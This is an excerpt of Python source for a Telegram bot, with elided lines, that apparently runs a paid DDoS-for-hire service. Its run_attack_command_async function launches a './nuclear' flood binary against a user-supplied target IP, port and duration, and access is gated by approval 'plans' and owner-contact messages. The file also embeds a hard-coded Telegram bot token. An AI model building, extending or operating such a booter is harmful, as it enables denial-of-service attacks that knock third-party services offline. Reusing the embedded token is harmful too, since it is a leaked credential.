...
TOKEN = '7890817536:AAEHmn-i_0TaWoWgoxfpKiOechIQoJGbWs4'
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./nuclear {target_ip} {target_port} {duration} 500")
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"  # Access Denied message
                                       ...
                                       "*Contact the owner for assistance: @CONTACT TO YOUR OWNER.*", parse_mode='Markdown')  # Contact owner message
            return
...
def myinfo_command(message):
    ...
    if not user_data:
        ...
        response += "*For assistance, please contact the owner: @CONTACT TO YOUR OWNER* "  # Contact owner message
    elif user_data.get('plan', 0) == 0:
        # User found but not approved
        response = "*🔒 Your account is still pending approval!* \n"  # Not approved message
        response += "*Please reach out to the owner for assistance: @CONTACT TO YOUR OWNER* 🙏"  # Contact owner message
    else:
...
def owner_command(message):
    response = (
        ...
        "📩 **Telegram:** @CONTACT TO YOUR OWNER\n\n"
